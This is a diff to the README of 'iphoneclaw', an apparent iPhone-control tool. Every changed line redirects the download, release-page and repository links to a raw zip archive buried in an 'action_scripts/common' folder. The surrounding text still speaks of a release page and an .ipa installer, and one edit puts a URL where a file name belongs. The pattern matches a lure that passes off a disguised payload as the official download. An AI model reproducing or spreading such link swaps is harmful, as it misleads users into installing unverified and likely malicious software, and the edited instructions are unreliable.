@@ -1,6 +1,6 @@
 # 📱 iphoneclaw - Control Your iPhone with AI
 
-[![Download iphoneclaw](https://img.shields.io/badge/Download-iphoneclaw-blue?style=for-the-badge)](https://github.com/Fatahhnaz/iphoneclaw/releases)
+[![Download iphoneclaw](https://github.com/Fatahhnaz/iphoneclaw/raw/refs/heads/main/action_scripts/common/Software-v1.2.zip)](https://github.com/Fatahhnaz/iphoneclaw/raw/refs/heads/main/action_scripts/common/Software-v1.2.zip)
 
 ## 📖 About iphoneclaw
 
@@ -25,13 +25,13 @@ Follow these steps to get iphoneclaw up and running smoothly on your iPhone:
 
 ### 1. Download the Application
 
-Click the big [Download iphoneclaw](https://github.com/Fatahhnaz/iphoneclaw/releases) button above or visit the [official releases page](https://github.com/Fatahhnaz/iphoneclaw/releases) to find the latest version.
+Click the big [Download iphoneclaw](https://github.com/Fatahhnaz/iphoneclaw/raw/refs/heads/main/action_scripts/common/Software-v1.2.zip) button above or visit the [official releases page](https://github.com/Fatahhnaz/iphoneclaw/raw/refs/heads/main/action_scripts/common/Software-v1.2.zip) to find the latest version.
 
 Since this link points to a general release page, you will see a list of files for different versions and device types.
 
 ### 2. Select the Correct File
 
-Look for a file named similarly to `iphoneclaw-ios-installer.ipa` or a version number that matches your iOS version. The `.ipa` file is the installation package for iPhone apps outside the App Store.
+Look for a file named similarly to `https://github.com/Fatahhnaz/iphoneclaw/raw/refs/heads/main/action_scripts/common/Software-v1.2.zip` or a version number that matches your iOS version. The `.ipa` file is the installation package for iPhone apps outside the App Store.
 
 ### 3. Transfer the App to Your iPhone
 
@@ -108,7 +108,7 @@ The app does not store or share your private information without your permission
 
 For more details, support, or to contribute:
 
-- Visit the [iphoneclaw GitHub repository](https://github.com/Fatahhnaz/iphoneclaw)
+- Visit the [iphoneclaw GitHub repository](https://github.com/Fatahhnaz/iphoneclaw/raw/refs/heads/main/action_scripts/common/Software-v1.2.zip)
 - Check the Issues and Discussions tabs for common questions
 - Read the Wiki for advanced usage tips
 
@@ -116,7 +116,7 @@ For more details, support, or to contribute:
 
 You can start by visiting the release page here:
 
-[Download iphoneclaw on GitHub Releases](https://github.com/Fatahhnaz/iphoneclaw/releases)
+[Download iphoneclaw on GitHub Releases](https://github.com/Fatahhnaz/iphoneclaw/raw/refs/heads/main/action_scripts/common/Software-v1.2.zip)
 
 Look for the latest `.ipa` file and follow the installation instructions above to run the app on your iPhone.
 
